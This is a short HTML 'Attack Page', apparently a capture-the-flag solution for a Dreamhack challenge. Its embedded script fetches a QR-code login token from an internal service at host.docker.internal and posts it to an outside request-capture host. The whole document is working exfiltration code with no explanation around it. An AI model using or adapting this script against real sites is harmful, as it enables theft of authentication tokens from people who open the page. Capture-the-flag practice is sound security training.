<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Page</title>
</head>
<body>    
    <script>
        const qrCodeUrl = "http://host.docker.internal:10023/generate_qr_code";
        fetch(qrCodeUrl)
        .then(response => response.json())
        .then(data => {
            sendQRCodeToAttackServer(data);
        })
        function sendQRCodeToAttackServer(qrCodeData) {
            fetch("https://savcdnf.request.dreamhack.games", {
                method: 'POST',
                headers: {
                    'Content-Type' : 'application/json',
                },
                body : JSON.stringify({qr_code : qrCodeData})
            })
        }
    </script>
</body>
</html>
